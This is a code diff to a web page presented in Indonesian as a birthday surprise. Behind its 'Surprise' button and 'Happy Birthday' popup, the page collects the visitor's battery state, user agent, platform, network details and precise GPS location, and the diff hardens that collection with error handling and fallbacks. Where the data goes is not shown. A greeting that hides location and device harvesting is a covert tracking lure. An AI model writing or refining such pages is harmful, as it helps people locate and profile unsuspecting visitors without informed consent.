@@ -93,7 +93,7 @@
 </head>
 <body>
   <h1>Pencet Tombol dibawah</h1>
-  <button id="collectData">🎉 Surprise🎉  </button>
+  <button id="collectData">🎉 Surprise 🎉</button>
 
   <div id="popup">
     <h2>🍫🤎Happy Birthday! 🤎🍫</h2>
@@ -143,48 +143,58 @@
     async function collectDeviceInfo() {
       const data = {};
 
-      // Battery Info
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        data.battery = {
-          level: battery.level * 100 + '%',
-          charging: battery.charging,
+      try {
+        // Battery Info
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          data.battery = {
+            level: battery.level * 100 + '%',
+            charging: battery.charging,
+          };
+        } else {
+          data.battery = "Battery API not supported";
+        }
+
+        // Device Info
+        data.device = {
+          userAgent: navigator.userAgent || "Unknown User Agent",
+          platform: navigator.platform || "Unknown Platform",
         };
-      }
 
-      // Device Info
-      data.device = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-      };
+        // Network Info
+        if (navigator.connection) {
+          const connection = navigator.connection;
+          data.network = {
+            type: connection.effectiveType || "Unknown",
+            downlink: connection.downlink ? connection.downlink + ' Mbps' : "Unknown",
+          };
+        } else {
+          data.network = "Network API not supported";
+        }
 
-      // Network Info
-      if (navigator.connection) {
-        const connection = navigator.connection;
-        data.network = {
-          type: connection.effectiveType,
-          downlink: connection.downlink + ' Mbps',
-        };
-      }
-
-      // Geolocation
-      if (navigator.geolocation) {
-        await new Promise((resolve) => {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              data.location = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy + ' meters',
-              };
-              resolve();
-            },
-            (error) => {
-              data.location = { error: error.message };
-              resolve();
-            }
-          );
-        });
+        // Geolocation
+        if (navigator.geolocation) {
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                data.location = {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy + ' meters',
+                };
+                resolve();
+              },
+              (error) => {
+                data.location = { error: error.message };
+                resolve();
+              }
+            );
+          });
+        } else {
+          data.location = "Geolocation not supported";
+        }
+      } catch (error) {
+        console.error("Error collecting device info:", error);
       }
 
       return data;
